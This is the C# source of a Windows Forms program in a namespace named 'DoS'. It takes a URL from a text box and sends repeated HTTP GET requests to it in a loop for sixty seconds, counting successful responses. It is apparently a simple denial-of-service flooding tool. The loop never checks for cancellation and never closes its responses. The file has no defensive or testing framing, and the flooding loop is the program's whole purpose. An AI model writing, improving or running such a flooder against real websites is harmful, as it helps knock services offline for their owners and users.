using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DoS
{
    public partial class Form1 : Form
    {
        private enum AppStates { Idle, Working };

        private BackgroundWorker _worker;

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SetAppState(AppStates.Working, txtURL.Text);

            try
            {
                // Set up background worker object & hook up handlers
                _worker = new BackgroundWorker();
                _worker.DoWork += new DoWorkEventHandler(bgWorker_DoWork);
                _worker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bgWorker_RunWorkerCompleted);
                _worker.WorkerReportsProgress = true;
                _worker.WorkerSupportsCancellation = true;
                _worker.ProgressChanged += new ProgressChangedEventHandler(bgWorker_ProgressChanged);

                // Launch background thread to do the work of reading the file.  This will
                // trigger BackgroundWorker.DoWork().  Note that we pass the filename to 
                // process as a parameter.  
                _worker.RunWorkerAsync(txtURL.Text);
            }
            catch
            {
                SetAppState(AppStates.Idle, null);
                throw;
            }
            
        }
        // Set new application state, handling button sensitivity, labels, etc.
        private void SetAppState(AppStates newState, string url)
        {
            switch (newState)
            {
                case AppStates.Idle:
                    // Hide progress widgets
                    btnSubmit.Enabled = true;
                    btnCancel.Enabled = false;
                    break;

                case AppStates.Working:
                    // Display progress widgets & file info
                    btnSubmit.Enabled = false;
                    btnCancel.Enabled = true;
                    break;
            }
        }
        // Do work--runs on a background thread
        void bgWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            // Note about exceptions:  If an exception originates anywhere in 
            // this method, or methods that it calls, the BackgroundWorker will
            // automatically populate the Error property of the RunWorkerCompletedEventArgs
            // parameter that gets passed into the RunWorkerCompleted event handler.
            // So we can handle the exception in that method.

           
            // url to process was passed to RunWorkerAsync(), so it's available
            // here in DoWorkEventArgs object.
            int success =0;
            int failed=0;
            BackgroundWorker bw = sender as BackgroundWorker;
            string url = (string)e.Argument;

            DateTime start = DateTime.Now;
            while (DateTime.Now.Subtract(start).Seconds < 60)
            {
           
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode == HttpStatusCode.OK)
                   success++;
                else 
                   failed++;

                // Stream resStream = response.GetResponseStream();
                bw.ReportProgress(success);
            }
            

            // If operation was cancelled (triggered by CancellationPending), 
            // But still need to set
            // Cancel flag, because RunWorkerCompleted event will still fire.
            if (bw.CancellationPending)
                e.Cancel = true;
        }

        void bgWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            try
            {
                if (e.Error != null)
                {
                    MessageBox.Show(e.Error.Message, "Error During connecting to URL");
                }
                else if (e.Cancelled)
                {
                    lblResults.Text = lblResults.Text + "** Cancelled **";
                }
                else
                {
                   // int numLines = (int)e.Result;
                    lblResults.Text = lblResults.Text + "** Completed **";
                }
            }
            finally
            {
                // State now goes back to idle
                SetAppState(AppStates.Idle, null);
            }
        }
      
        void bgWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            // Just update progress bar with % complete
            //txtURL.Text = e.ProgressPercentage.ToString();
            txtSuccess.Text = e.ProgressPercentage.ToString();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            _worker.CancelAsync();
            btnCancel.Enabled = false;
            btnSubmit.Enabled = true;
        }
    }
}
